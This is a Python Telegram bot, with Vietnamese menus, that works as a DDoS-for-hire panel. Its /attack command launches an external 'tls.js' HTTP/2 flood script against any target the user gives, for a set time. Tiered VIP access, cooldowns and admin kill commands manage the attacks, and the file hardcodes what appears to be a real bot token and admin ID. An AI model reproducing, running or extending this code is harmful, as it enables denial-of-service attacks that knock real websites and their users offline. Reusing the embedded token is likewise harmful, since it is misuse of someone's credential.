import subprocess
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
import os

============================

CONFIG

============================

TOKEN = "8404591037:AAFn-zck0anDPjaR2mcSY8fulg5-Iphdq6A"
ADMINS = [7105201572]
VIP = [7105201572]
COOLDOWN = {}
BANNED_WORDS = ["vib","baomoi","edu", "chinhphu", "gov", ".gov", "goc.vn"]
bot = Bot(TOKEN, request_timeout=60)
dp = Dispatcher()

============================

VIDEO CONFIG

============================

VIDEO_LINK = "https://files.catbox.moe/vhzt1u.mp4"  # default video lofi chill

============================

/help

============================

@dp.message(Command("help"))
async def help_cmd(msg: types.Message):
text = """
📘 DANH SÁCH LỆNH BOT NhânDev
🔥 LỆNH CHÍNH
/attack <target> <time>
→ Tấn công mục tiêu
• User thường: max 120s + cooldown 140s
• VIP: không giới hạn
💠 VIP SYSTEM
/viplist – xem danh sách VIP
Admin:
/addvip <id> – thêm VIP
/delvip <id> – xoá VIP
/setvideo <link_mp4> – đổi video gửi sau attack
🛠 ADMIN TOOL
/kill – dừng toàn bộ attack
/cpu – xem CPU
/ram – xem RAM
ℹ️ KHÁC
/help – xem danh sách lệnh
👑 Dev: Nhân Dev
"""
await msg.reply(text, parse_mode="Markdown")

============================

/attack

============================

@dp.message(Command("attack"))
async def attack(msg: types.Message):
user = msg.from_user.id
text = msg.text.split()
if len(text) != 3:
return await msg.reply("⚙️ Dùng: /attack <target> <time>")
_, target, time = text
time = int(time)
# banned domains
for w in BANNED_WORDS:
if w in target.lower():
return await msg.reply("🚫 Domain này bị cấm!")
# user time limit
if user not in VIP and time > 120:
return await msg.reply("⛔  User thường chỉ được tối đa 120s")
# cooldown
now = asyncio.get_event_loop().time()
if user not in VIP:
if user in COOLDOWN and COOLDOWN[user] > now:
wait = int(COOLDOWN[user] - now)
return await msg.reply(f"⏳  Cooldown {wait}s")
COOLDOWN[user] = now + 140
await msg.reply(
f"🚀 Attack started!\n🎯 Target: {target}\n⏱ Time: {time}s"
)
cmd = [
"node", "tls.js", "GET", target, str(time), "4", "5", "y.txt",
"--http", "2", "--winter", "--full"
]
process = subprocess.Popen(cmd)
await asyncio.sleep(time)
process.kill()
# send mp4 video
await msg.answer_video(
video=VIDEO_LINK,
caption="🔥 Attack hoàn tất!\nMade by NhânDev"
)

============================

/kill (ADMIN)

============================

@dp.message(Command("kill"))
async def kill_attack(msg: types.Message):
if msg.from_user.id not in ADMINS:
return await msg.reply("❌  Không có quyền dùng /kill")
subprocess.call(["pkill", "-f", "tls.js"])
subprocess.call(["pkill", "node"])
await msg.reply("🛑 Đã kill toàn bộ attack!")

============================

/cpu (ADMIN)

============================

@dp.message(Command("cpu"))
async def cpu_check(msg: types.Message):
if msg.from_user.id not in ADMINS:
return await msg.reply("❌  Không có quyền!")
cpu = os.popen("top -bn1 | grep 'Cpu(s)'").read()
await msg.reply(f"⚙️ CPU STATUS:\n{cpu}")

============================

/ram (ADMIN)

============================

@dp.message(Command("ram"))
async def ram_check(msg: types.Message):
if msg.from_user.id not in ADMINS:
return await msg.reply("❌  Không có quyền!")
ram = os.popen("free -h").read()
await msg.reply(f"💾 RAM STATUS:\n{ram}")

============================

VIP SYSTEM

============================

@dp.message(Command("addvip"))
async def addvip(msg: types.Message):
if msg.from_user.id not in ADMINS:
return await msg.reply("❌  Không có quyền!")
try:
user_id = int(msg.text.split()[1])
VIP.append(user_id)
await msg.reply(f"✅  Đã thêm {user_id} vào VIP")
except:
await msg.reply("⚠️ Dùng: /addvip <user_id>")
@dp.message(Command("delvip"))
async def delvip(msg: types.Message):
if msg.from_user.id not in ADMINS:
return await msg.reply("❌  Không có quyền!")
try:
user_id = int(msg.text.split()[1])
VIP.remove(user_id)
await msg.reply(f"❌  Đã xóa {user_id} khỏi VIP")
except:
await msg.reply("⚠️ Dùng: /delvip <user_id>")
@dp.message(Command("viplist"))
async def vip_list(msg: types.Message):
vip_text = "\n".join([str(i) for i in VIP])
await msg.reply(f"⭐  DANH SÁCH VIP:\n{vip_text}")

============================

/setvideo (ADMIN)

============================

@dp.message(Command("setvideo"))
async def set_video(msg: types.Message):
global VIDEO_LINK
if msg.from_user.id not in ADMINS:
return await msg.reply("❌  Không có quyền!")
try:
new_link = msg.text.split()[1]
VIDEO_LINK = new_link
await msg.reply(f"✅  Đã cập nhật video mới:\n{VIDEO_LINK}")
except:
await msg.reply("⚠️ Dùng: /setvideo <link_mp4>")

============================

RUN BOT

============================

async def main():
print("🚀 Bot NhânDev đã khởi động!")
await dp.start_polling(bot, timeout=60)
if name == "main":
import logging
logging.basicConfig(level=logging.INFO)
asyncio.run(main())
